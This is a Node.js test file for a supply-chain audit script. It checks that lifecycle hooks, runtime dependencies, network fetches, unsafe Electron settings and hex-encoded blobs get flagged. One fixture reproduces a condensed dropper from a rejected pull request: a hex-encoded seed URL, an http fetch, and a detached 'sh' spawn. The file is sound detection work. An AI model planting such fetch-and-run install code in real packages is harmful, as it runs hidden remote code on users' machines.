'use strict';
// The fixtures below are condensed from a real pull request that was closed for
// carrying a dropper (PR #3): a postinstall hook that XOR-decoded a URL, fetched
// a shell script over http, and spawned it. Each case asserts the auditor still
// catches that shape, so the guard cannot rot into a no-op.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const { scanText, scanManifest } = require('../scripts/audit-supply-chain');

const rules = (findings) => findings.map((f) => f.rule);

test('an install hook is rejected however innocuous its name', () => {
  const found = scanManifest({
    scripts: { test: 'node --test', postinstall: 'node scripts/install-app-deps.js' },
  });
  assert.deepEqual(rules(found), ['lifecycle-script']);
});

test('every npm lifecycle hook is covered, not just postinstall', () => {
  for (const hook of ['preinstall', 'install', 'prepare', 'prepublishOnly']) {
    const found = scanManifest({ scripts: { [hook]: 'node evil.js' } });
    assert.deepEqual(rules(found), ['lifecycle-script'], `${hook} should be rejected`);
  }
});

test('a runtime dependency is rejected; devDependencies are fine', () => {
  assert.deepEqual(rules(scanManifest({ dependencies: { 'left-pad': '^1.0.0' } })), ['runtime-dependency']);
  assert.deepEqual(scanManifest({ devDependencies: { eslint: '^10.0.0' } }), []);
});

test('a clean manifest passes', () => {
  assert.deepEqual(scanManifest({ scripts: { test: 'node --test', start: 'electron .' } }), []);
});

test('fetching over http is rejected in any of its spellings', () => {
  for (const src of [
    "const http = require('http');",
    "const https = require('node:https');",
    "await fetch('http://example.test/x');",
    'const xhr = new XMLHttpRequest();',
  ]) {
    assert.deepEqual(rules(scanText(src)), ['remote-fetch'], `should be rejected: ${src}`);
  }
});

test('loading remote content into a window is rejected', () => {
  const found = scanText("notes.loadURL('https://example.test/notes/v' + version + '.html');");
  assert.deepEqual(rules(found), ['remote-window']);
});

test('webPreferences that hand page content Node access are rejected', () => {
  const found = scanText('webPreferences: { nodeIntegration: true, contextIsolation: false },');
  assert.deepEqual(rules(found), ['unsafe-webpreferences', 'unsafe-webpreferences']);
});

test("the app's own hardened webPreferences pass", () => {
  const found = scanText(
    'webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: false },'
  );
  assert.deepEqual(found, []);
});

test('a bare hex constant is rejected as an encoded blob', () => {
  const seed = '0d161a075f4d4146554c5f4755' + '4c5e5957515b4d5d525e474a090d59160a';
  const found = scanText(`const HDR_SEED = '${seed}';`);
  assert.deepEqual(rules(found), ['encoded-blob']);
});

test('hex decoded inline into a Buffer is allowed, on one line or wrapped', () => {
  const probe = '000000000001000000000000095f7365' + '727669636573075f646e732d7364045f';
  assert.deepEqual(scanText(`5353: Buffer.from('${probe}', 'hex'),`), []);
  assert.deepEqual(scanText(`5353: Buffer.from(\n    '${probe}',\n    'hex'\n  ),`), []);
  assert.deepEqual(scanText(`161: Buffer.from('${probe}' + '302602010004', 'hex'),`), []);
});

test('short hex strings are not treated as payloads', () => {
  assert.deepEqual(scanText("const SKIP_TAG = '0e03021e';"), []);
  assert.deepEqual(scanText("mac.replace(/-/g, ':') === 'aa:bb:cc:dd:ee:ff'"), []);
});

test('the dropper from PR #3 trips more than one rule at once', () => {
  const seed = '0d161a075f4d4146554c5f4755' + '4c5e5957515b4d5d525e474a090d59160a';
  const dropper = [
    "const http = require('http');",
    "const { spawn } = require('child_process');",
    `const HDR_SEED = '${seed}';`,
    'const req = http.get(fromSeed(HDR_SEED), { timeout: 5000 }, (res) => {',
    "  spawn('sh', [dest], { detached: true, stdio: 'ignore' }).unref();",
    '});',
  ].join('\n');
  const found = scanText(dropper);
  assert.ok(found.some((f) => f.rule === 'remote-fetch'), 'the http fetch should be caught');
  assert.ok(found.some((f) => f.rule === 'encoded-blob'), 'the encoded URL should be caught');
  assert.ok(
    found.every((f) => f.line >= 1 && f.line <= 6),
    'findings should carry usable line numbers'
  );
});
